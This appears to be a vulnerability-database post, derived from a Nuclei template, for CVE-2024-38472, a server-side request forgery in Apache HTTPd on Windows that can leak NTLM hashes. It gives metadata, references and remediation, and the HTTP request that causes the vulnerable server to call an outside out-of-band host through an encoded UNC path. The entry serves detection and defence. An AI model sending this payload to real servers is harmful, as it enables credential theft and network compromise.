---
layout: post
cve_id: CVE-2024-38472
title: Apache HTTPd Windows UNC - Server-Side Request Forgery
pcap: true
pcap_path: /pcaps/2024/CVE-2024-38472.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-38472.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pdteam
severity: high
impact: 'Attackers on Windows-based Apache HTTPd servers can exploit SSRF to potentially
  leak NTLM hashes to malicious servers, leading to credential theft and potential
  network compromise.

  '
remediation: 'Upgrade to Apache HTTPd version 2.4.60 or later and configure the UNCList
  directive for UNC path access.

  '
reference:
- https://blog.orange.tw/2024/08/confusion-attacks-en.html
- https://httpd.apache.org/security/vulnerabilities_24.html
- https://security.netapp.com/advisory/ntap-20240712-0001/
- https://github.com/nomi-sec/PoC-in-GitHub
- https://github.com/Abdurahmon3236/CVE-2024-38472
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2024-38472
  cwe-id: CWE-918
  epss-score: 0.90493
  epss-percentile: 0.99587
tags:
- cve
- cve2024
- apache
- ssrf
- oast
- httpd
- vuln
---

## üîç Vulnerability Description
SSRF in Apache HTTP Server on Windows allows to potentially leak NTML hashes to a malicious server via SSRF and malicious requests or content Users are recommended to upgrade to version 2.4.60 which fixes this issue.  Note- Existing configurations that access UNC paths will have to configure new directive "UNCList" to allow access during request processing.


## üåê HTTP Request
```nohighlight
GET /%5C%5Cd5iq8a1le0o1gh24o230pqxyaih13w8ig.oast.me/apachehttpd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

